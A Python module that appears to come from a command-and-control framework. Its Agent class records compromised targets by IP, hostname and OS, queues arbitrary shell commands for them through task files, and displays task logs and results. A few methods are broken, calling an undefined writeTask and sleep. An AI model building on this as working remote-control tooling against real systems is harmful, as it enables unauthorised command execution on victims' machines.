#!/usr/bin/python3
import os
import time
import red_alert.mastermind.core.menu as men
from .common import *

# choose a random element from a list
from random import seed, choice
from datetime import datetime

from shutil import rmtree


class Agent:
    def __init__(
        self, listener_name, uuid, tgt_ip, tgt_hostname, tgt_os, tgt_version
    ):
        self.listener_name = listener_name
        self.name = uuid
        self.tgt_ip = tgt_ip
        self.tgt_hostname = tgt_hostname
        self.tgt_os = tgt_os
        self.tgt_version = tgt_version
        self.has_tasks = False
        self.path = (
            f"../data/listeners/{self.listener_name}/agents/{self.name}/"
        )
        self.tasks_path = "{}tasks.txt".format(self.path, self.name)
        self.tasks_log_path = "{}tasks_log.txt".format(self.path, self.name)
        self.results_path = f"{self.path}results"

        self.task_ids = []

        if not os.path.exists(self.path):
            os.mkdir(self.path)

        if not os.path.exists(self.results_path):
            os.mkdir(self.results_path)

        self.menu = men.Menu(self.name)

        self.menu.registerCommand(
            "cmd", "Execute a shell command.", "<command>"
        )
        self.menu.registerCommand(
            "tasks", "View issued tasks and their status.", ""
        )
        self.menu.registerCommand("clear", "Clear tasks.", "")
        self.menu.registerCommand("results", "View task results.", "<task ID>")

        self.menu.uCommands()

        self.Commands = self.menu.Commands

    def write_task(self, task):

        # Reads file into memory and prepends file with new task.
        # Each task is inserted as beginning of file, as initiate looks for
        # end of file
        # indicator which is "$"
        if not os.path.exists(self.tasks_path):
            with open(self.tasks_path, "w") as f:
                f.write("$\n")

        with open(self.tasks_path, "r+") as f:
            content = f.read()
            f.seek(0, 0)
            f.write(task.rstrip("\r\n") + "\n" + content)
            self.has_tasks = True

    def clearTasks(self):

        if os.path.exists(self.tasks_path):
            os.remove(self.tasks_path)
        else:
            pass

    def rename(self, newname):

        task = "rename " + newname
        self.writeTask(task)

        progress("Waiting for agent.")
        while os.path.exists(self.tasks_path):
            pass

        return 0

    def generate_task_ids(self):
        for i in range(1000, 9999):
            self.task_ids.append(i)

    def get_task_id(self):
        seed(datetime.now())
        task_id = choice(self.task_ids)
        self.task_ids.remove(task_id)
        return task_id

    def log_task(self, task):
        with open(self.tasks_log_path, "a") as f:
            f.write(task)

    def view_tasks(self):
        if os.path.exists(self.tasks_log_path):
            print(YELLOW)
            print(
                "  ID             Status                Type                  Command"
            )
            print(
                "------         ----------            ---------              ----------"
            )
            with open(self.tasks_log_path, "r") as f:
                print(f.read())
        else:
            error("No tasks to display.")

    def cmd(self, args):

        if len(args) == 0:
            error("Missing command.")
        else:
            if not self.task_ids:
                self.generate_task_ids()
            command = " ".join(args)
            task_id = self.get_task_id()
            task = f"#{task_id} 0 {command}\n"
            self.write_task(task)
            task = f" {task_id}           assigned              cmd                    {command}\n"
            self.log_task(task)


    def view_results(self, args):
        if len(args) == 0:
            error("Missing command.")

        print(YELLOW)
        print(
            f"                                    TASK {args[0]} RESULTS                                 "
        )
        print(
            "  -----------------------------------------------------------------------------------\n"
        )

        if os.path.exists(f"{self.results_path}/{args[0]}.txt"):
            with open(f"{self.results_path}/{args[0]}.txt", "r") as f:
                print(f.read())
        else:
            error("No results to display.")

    def ev(self, command, args):

        if command == "help":
            self.menu.showHelp()
        elif command == "home":
            men.home()
        elif command == "exit":
            men.Exit()
        elif command == "cmd":
            self.cmd(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTasks()
        elif command == "tasks":
            self.view_tasks()
        elif command == "results":
            self.view_results(args)

    def task_agent(self):

        self.menu.clearScreen()

        while True:

            try:
                command, args = self.menu.parse()
            except:
                continue

            if command not in self.Commands:
                error("Invalid command.")
            else:
                self.ev(command, args)
